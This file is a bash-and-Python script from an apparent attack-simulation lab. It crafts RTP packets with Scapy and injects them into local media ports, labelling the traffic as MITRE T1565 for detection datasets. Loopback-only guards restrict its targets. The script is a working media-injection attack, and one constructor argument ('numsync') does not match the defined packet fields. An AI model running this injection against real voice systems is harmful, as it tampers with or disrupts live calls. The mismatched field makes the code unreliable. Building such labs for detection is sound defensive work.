#!/usr/bin/env bash
# Media: controlled RTP injection into the local lab media port range.
# MITRE: T1565 (Data Manipulation)
# Detection: unexpected RTP SSRC, sequence, payload, or source port on an active media flow.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "${SCRIPT_DIR}/../.." && pwd)"

PYTHON_BIN="${PYTHON_BIN:-python3}"
TARGET_HOST="${TARGET_HOST:-127.0.0.1}"
RTP_PORT_MIN="${RTP_PORT_MIN:-30000}"
RTP_PORT_MAX="${RTP_PORT_MAX:-30100}"
RTP_INJECT_PORTS="${RTP_INJECT_PORTS:-${MEDIA_PORT:-${RTP_PORT_MIN}}}"
PACKET_COUNT="${PACKET_COUNT:-120}"
RATE_PPS="${RATE_PPS:-20}"
PAYLOAD_SIZE="${PAYLOAD_SIZE:-160}"
SRC_PORT="${SRC_PORT:-40000}"
RTP_PAYLOAD_TYPE="${RTP_PAYLOAD_TYPE:-0}"
WAIT_FOR_CALL_SECONDS="${WAIT_FOR_CALL_SECONDS:-0}"
RTPENGINE_API_URL="${RTPENGINE_API_URL:-}"
LABEL_SRC_IP="${ATTACKER_SRC_IP:-127.0.0.1}"

require_uint() {
  local name="$1"
  local value="$2"
  if [ -z "${value}" ] || [[ "${value}" == *[!0-9]* ]]; then
    echo "${name} must be a positive integer: ${value}" >&2
    exit 2
  fi
}

require_port() {
  local name="$1"
  local value="$2"
  require_uint "${name}" "${value}"
  if [ "${value}" -le 0 ] || [ "${value}" -gt 65535 ]; then
    echo "${name} out of range: ${value}" >&2
    exit 2
  fi
}

case "${TARGET_HOST}" in
  127.*|localhost)
    ;;
  *)
    echo "refusing non-loopback RTP target: ${TARGET_HOST}" >&2
    exit 2
    ;;
esac

case "${LABEL_SRC_IP}" in
  127.*|localhost)
    ;;
  *)
    echo "refusing non-loopback label source: ${LABEL_SRC_IP}" >&2
    exit 2
    ;;
esac

require_port "RTP_PORT_MIN" "${RTP_PORT_MIN}"
require_port "RTP_PORT_MAX" "${RTP_PORT_MAX}"
require_uint "PACKET_COUNT" "${PACKET_COUNT}"
require_uint "RATE_PPS" "${RATE_PPS}"
require_uint "PAYLOAD_SIZE" "${PAYLOAD_SIZE}"
require_port "SRC_PORT" "${SRC_PORT}"
require_uint "RTP_PAYLOAD_TYPE" "${RTP_PAYLOAD_TYPE}"
require_uint "WAIT_FOR_CALL_SECONDS" "${WAIT_FOR_CALL_SECONDS}"

if [ "${PACKET_COUNT}" -le 0 ] || [ "${RATE_PPS}" -le 0 ] || [ "${PAYLOAD_SIZE}" -le 0 ]; then
  echo "PACKET_COUNT, RATE_PPS, and PAYLOAD_SIZE must be greater than zero" >&2
  exit 2
fi

if [ "${RTP_PORT_MIN}" -gt "${RTP_PORT_MAX}" ]; then
  echo "RTP_PORT_MIN must be <= RTP_PORT_MAX" >&2
  exit 2
fi

IFS=',' read -r -a TARGET_PORTS <<< "${RTP_INJECT_PORTS}"
if [ "${#TARGET_PORTS[@]}" -eq 0 ]; then
  echo "RTP_INJECT_PORTS must contain at least one UDP port" >&2
  exit 2
fi

for target_port in "${TARGET_PORTS[@]}"; do
  require_port "RTP_INJECT_PORTS entry" "${target_port}"
  if [ "${target_port}" -lt "${RTP_PORT_MIN}" ] || [ "${target_port}" -gt "${RTP_PORT_MAX}" ]; then
    echo "RTP inject port ${target_port} is outside ${RTP_PORT_MIN}-${RTP_PORT_MAX}" >&2
    exit 2
  fi
done

if [ "${RTP_PAYLOAD_TYPE}" -gt 127 ]; then
  echo "RTP_PAYLOAD_TYPE must be 0..127" >&2
  exit 2
fi

echo "==> RTP inject ${TARGET_HOST} ports=${RTP_INJECT_PORTS} packets=${PACKET_COUNT} rate=${RATE_PPS}/s"

TARGET_HOST="${TARGET_HOST}" \
RTP_INJECT_PORTS="${RTP_INJECT_PORTS}" \
PACKET_COUNT="${PACKET_COUNT}" \
RATE_PPS="${RATE_PPS}" \
PAYLOAD_SIZE="${PAYLOAD_SIZE}" \
SRC_PORT="${SRC_PORT}" \
RTP_PAYLOAD_TYPE="${RTP_PAYLOAD_TYPE}" \
WAIT_FOR_CALL_SECONDS="${WAIT_FOR_CALL_SECONDS}" \
RTPENGINE_API_URL="${RTPENGINE_API_URL}" \
"${PYTHON_BIN}" <<'PY'
from __future__ import annotations

import ipaddress
import json
import os
import random
import re
import socket
import sys
import time
from collections.abc import Mapping, Sequence
from urllib.parse import urlparse

try:
    from scapy.fields import BitField, IntField, ShortField
    from scapy.packet import Packet
    from scapy.packet import Raw
except Exception as exc:
    print(f"scapy is required: {exc}", file=sys.stderr)
    sys.exit(1)

try:
    import httpx
except Exception:
    httpx = None


class RTP(Packet):
    name = "RTP"
    fields_desc = [
        BitField("version", 2, 2),
        BitField("padding", 0, 1),
        BitField("extension", 0, 1),
        BitField("csrc_count", 0, 4),
        BitField("marker", 0, 1),
        BitField("payload_type", 0, 7),
        ShortField("sequence", 0),
        IntField("timestamp", 0),
        IntField("ssrc", 0),
    ]


def require_loopback_host(host: str) -> str:
    candidate = "127.0.0.1" if host == "localhost" else host
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(candidate))
    except OSError as exc:
        raise SystemExit(f"cannot resolve target host {host}: {exc}") from exc
    if not ip.is_loopback:
        raise SystemExit(f"refusing non-loopback target {host} resolved to {ip}")
    return str(ip)


def require_loopback_url(url: str) -> None:
    parsed = urlparse(url)
    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
        raise SystemExit(f"RTPENGINE_API_URL must be an HTTP(S) URL: {url}")
    require_loopback_host(parsed.hostname)


def numeric_value(value: object) -> float | None:
    if isinstance(value, bool):
        return None
    if isinstance(value, (int, float)):
        return float(value)
    if isinstance(value, str):
        try:
            return float(value)
        except ValueError:
            return None
    return None


def json_has_active_call(value: object, key_path: str = "") -> bool:
    if isinstance(value, Mapping):
        for key, child in value.items():
            child_path = f"{key_path}.{key}".lower()
            number = numeric_value(child)
            if number is not None and number > 0:
                has_media_word = any(word in child_path for word in ("call", "session", "stream"))
                has_active_word = any(word in child_path for word in ("active", "current", "open", "established"))
                if has_media_word and has_active_word:
                    return True
            if json_has_active_call(child, child_path):
                return True
    elif isinstance(value, Sequence) and not isinstance(value, (str, bytes, bytearray)):
        return any(json_has_active_call(child, key_path) for child in value)
    return False


def text_has_active_call(text: str) -> bool:
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        lower = line.lower()
        has_media_word = any(word in lower for word in ("call", "session", "stream"))
        has_active_word = any(word in lower for word in ("active", "current", "open", "established"))
        if not has_media_word or not has_active_word:
            continue
        match = re.search(r"([-+]?[0-9]+(?:\.[0-9]+)?)\s*$", line)
        if match and float(match.group(1)) > 0:
            return True
    return False


def wait_for_call(api_url: str, timeout_seconds: int) -> None:
    if not api_url:
        print("rtpengine API not configured; using blind RTP injection mode")
        return
    require_loopback_url(api_url)
    if timeout_seconds <= 0:
        print("rtpengine API configured but WAIT_FOR_CALL_SECONDS=0; using blind RTP injection mode")
        return
    if httpx is None:
        print("httpx unavailable; using blind RTP injection mode", file=sys.stderr)
        return

    deadline = time.monotonic() + timeout_seconds
    while time.monotonic() < deadline:
        try:
            response = httpx.get(api_url, timeout=2.0)
            if response.status_code < 400:
                try:
                    if json_has_active_call(response.json()):
                        print("rtpengine API indicates an active media session")
                        return
                except json.JSONDecodeError:
                    if text_has_active_call(response.text):
                        print("rtpengine API indicates an active media session")
                        return
        except httpx.HTTPError as exc:
            print(f"rtpengine API poll failed: {exc}", file=sys.stderr)
        time.sleep(1.0)

    print(f"no active media session detected after {timeout_seconds}s; continuing blind")


def parse_ports(raw: str) -> list[int]:
    ports = [int(part) for part in raw.split(",") if part]
    if not ports:
        raise SystemExit("RTP_INJECT_PORTS must contain at least one port")
    return ports


target_host = os.environ["TARGET_HOST"]
target_ip = require_loopback_host(target_host)
ports = parse_ports(os.environ["RTP_INJECT_PORTS"])
packet_count = int(os.environ["PACKET_COUNT"])
rate_pps = int(os.environ["RATE_PPS"])
payload_size = int(os.environ["PAYLOAD_SIZE"])
src_port = int(os.environ["SRC_PORT"])
payload_type = int(os.environ["RTP_PAYLOAD_TYPE"])
wait_for_call(os.environ.get("RTPENGINE_API_URL", ""), int(os.environ["WAIT_FOR_CALL_SECONDS"]))

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(("127.0.0.1", src_port))

sequence = random.randint(0, 65535)
timestamp = random.randint(0, 2**32 - 1)
ssrc = random.randint(1, 2**32 - 1)
interval = 1.0 / rate_pps
payload = bytes((0x55 + (i % 32)) & 0xFF for i in range(payload_size))

for index in range(packet_count):
    target_port = ports[index % len(ports)]
    packet = RTP(
        version=2,
        padding=0,
        extension=0,
        numsync=0,
        marker=0,
        payload_type=payload_type,
        sequence=(sequence + index) & 0xFFFF,
        timestamp=(timestamp + (index * payload_size)) & 0xFFFFFFFF,
        ssrc=ssrc,
    ) / Raw(payload)
    sock.sendto(bytes(packet), (target_ip, target_port))
    time.sleep(interval)

print(
    "sent RTP injection packets "
    f"target={target_ip} ports={','.join(str(port) for port in ports)} "
    f"src_port={src_port} packets={packet_count} payload_type={payload_type} ssrc={ssrc}"
)
PY

PYTHONPATH="${REPO_ROOT}${PYTHONPATH:+:${PYTHONPATH}}" "${PYTHON_BIN}" -m attacks.orchestrator.label_emitter \
  "${LABEL_SRC_IP}" \
  "rtp_inject" \
  "T1565" \
  "media" \
  "Scapy RTP injection to ${TARGET_HOST}:${RTP_INJECT_PORTS}; packets=${PACKET_COUNT}; rate=${RATE_PPS}/s; payload_type=${RTP_PAYLOAD_TYPE}; src_port=${SRC_PORT}"
